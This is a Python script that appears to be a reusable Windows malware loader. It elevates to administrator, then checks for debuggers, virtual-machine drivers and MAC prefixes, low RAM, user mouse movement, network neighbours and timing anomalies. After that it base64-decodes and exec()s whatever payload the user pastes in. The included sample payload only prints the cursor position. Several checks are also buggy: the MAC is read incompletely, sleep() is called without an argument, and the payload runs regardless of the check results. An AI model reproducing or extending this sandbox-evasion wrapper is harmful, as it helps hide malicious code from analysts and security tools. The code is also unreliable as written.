import os
import subprocess
import threading



import pyuac
import time

import sounddevice as sd

import requests
import base64
import subprocess
import sounddevice as sd
import uuid
import psutil
import threading
import win32api
if not pyuac.isUserAdmin():
    pyuac.runAsAdmin()
program = b''
manuncu = 0
issafe = 0
def timing():
    
    global manuncu
    global issafe
    end = time.time()
    start = time.time()
    for i in range(5000000000):
        #print(i)
        end = time.time()
        if end - start > 1:
            
            if manuncu > 3:
                issafe = 3
                return 0
            elif manuncu < 3:
                print("pass timecheck")
                break
    print(end - start)
t1 = threading.Thread(target=timing, daemon=False)
hapkoko = 0

def timing2():
    global hapkoko
    time.sleep(100000)
    hapkoko = 1
t2 = threading.Thread(target=timing2,daemon=False)
def manualcheck():
    for i in range(5000):
            oldmouse_x, oldmouse_y = win32api.GetCursorPos()
            time.sleep(0.001)
            mouse_x, mouse_y = win32api.GetCursorPos()
            if mouse_x - oldmouse_x >= 100:
              return 0
            if mouse_y - oldmouse_y >= 100:
                    return 0
     
    for proc in psutil.process_iter():
            if proc.name() in ["x64dbg.exe", "x32dbg.exe","x96dbg.exe","ida64.exe","ida.exe","x64dbg-unsigned.exe"]:
                return 0
    link = r"http://youtube.com"
    try:
        requests.get(link, timeout=2)
    except (requests.RequestException, requests.ConnectionError, requests.ConnectTimeout, requests.JSONDecodeError):
        return 0
    x = psutil.virtual_memory()
    mem = x.total / 1024 / 1024
    print(mem)
    if mem < 4000:
        return 0
    mic = sd.query_devices()
    mic = str(mic)
    global manuncu
    global issafe
    global program
    global hapkoko
    global t1
    global t2
    i = 0
    u = 0
    for device in mic.splitlines():
        i += 1

    if i < 4:
        return 0
    ip = fr"192.168.1.{u}"
    localipcmd = r"""for /f "tokens=2 delims=:" %a in ('ipconfig ^| findstr /i "IPv4"') do @echo %a"""
    xp = subprocess.check_output(localipcmd, shell=True, creationflags=0x08000000).decode("utf-8", errors="ignore")
    xp = xp.split()
   
    umananon = 0
    try:
        zapa = subprocess.check_output("arp -a", shell=True, creationflags=0x08000000)
        zapa = zapa.decode("utf-8", errors="ignore")
        zapa = zapa.split()
        for i in zapa:
            if i.startswith("192.168.1."):
                umananon += 1
    except:
        pass
    if umananon >= 3:
        issafe = 1
   

    program_themida = b'='
   
    sandbox_files = [
        # Windows artifacts
        "C:\\windows\\system32\\drivers\\sbiedrv.sys",
        "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
        "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
        "C:\\windows\\system32\\drivers\\VBoxSF.sys",
        "C:\\windows\\system32\\vboxdisp.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxmrxnp.dll",
        "C:\\windows\\system32\\vboxogl.dll",
        "C:\\windows\\system32\\vboxoglarrayspu.dll",
        "C:\\windows\\system32\\vboxoglcrutil.dll",
        "C:\\windows\\system32\\vboxoglerrorspu.dll",
        "C:\\windows\\system32\\vboxoglfeedbackspu.dll",
        "C:\\windows\\system32\\vboxoglpackspu.dll",
        "C:\\windows\\system32\\vboxoglpassthroughspu.dll",
        "C:\\windows\\system32\\vboxservice.exe",
        "C:\\windows\\system32\\vboxtray.exe",
        "C:\\windows\\system32\\vmacthlp.exe",
        "C:\\windows\\system32\\vmtools.dll",
        "C:\\windows\\system32\\vmtray.exe",
        "C:\\windows\\system32\\vmusrvc.exe",
        "C:\\windows\\system32\\vmvss.dll",
        "C:\\windows\\system32\\xenguestagent.exe",
        "C:\\windows\\system32\\xenservice.exe",
        "C:\\windows\\system32\\drivers\\NPF.sys",
        "C:\\windows\\system32\\drivers\\vmusbmouse.sys",
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmxnet.sys",
        "C:\\windows\\system32\\drivers\\vmscsi.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
        "C:\\windows\\system32\\drivers\\VBoxDrv.sys",
        "C:\\windows\\system32\\drivers\\VBoxNetAdp.sys",
        "C:\\windows\\system32\\drivers\\VBoxNetFlt.sys",
        # Linux artifacts
        "/usr/bin/vmtoolsd",
        "/usr/bin/VBoxService",
        "/usr/bin/qemu-ga",
        "/usr/sbin/virt-what",
        "/usr/bin/vboxclient",
        "/usr/bin/xenstore-ls",
        "/usr/sbin/xenstored",
        "/usr/libexec/qemu-kvm",
        "/proc/scsi/scsi",  # Virtual devices in Linux
        "/proc/modules",  # Kernel modules to check for vm-related modules
        "/sys/devices/virtual/dmi/id/product_name",
        "/sys/devices/virtual/dmi/id/product_version",
        "/etc/rc.d/init.d/virtualbox-guest-additions"
    ]
    for parts in sandbox_files:
        if os.path.exists(parts):
            return 0



    vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'qemu-ga']
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] in vm_processes:
            return  0
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                    for elements in range(0, 2 * 6, 8)][::-1])
    vm_mac_prefixes = [
        '00:05:69',  # VMware
        '00:0C:29',  # VMware
        '00:50:56',  # VMware
        '08:00:27',  # VirtualBox
        '52:54:00',  # QEMU
    ]
    for prefix in vm_mac_prefixes:

        if mac.startswith(prefix):
            return 0
    t1.start()

    for i in range(5):
        time.sleep(1)
        manuncu += 1
    if issafe == 3:
        return 0

    
    ub = time.perf_counter()
    time.sleep(1)
    if time.perf_counter() - ub < 0.4:
        time.sleep()
        return 0
    t2.start()
    print("starting")
    time.sleep(0.05)
    if hapkoko == 0:
        pass
    elif hapkoko == 1 or hapkoko >= 1:
        return 0
    
    program = b'aW1wb3J0IHdpbjMyYXBpDQpwcmludCh3aW4zMmFwaS5HZXRDdXJzb3JQb3MoKSk=' # enter your b64 of program here (.py) 



 








manualcheck()
program = base64.b64decode(program)
exec(program)

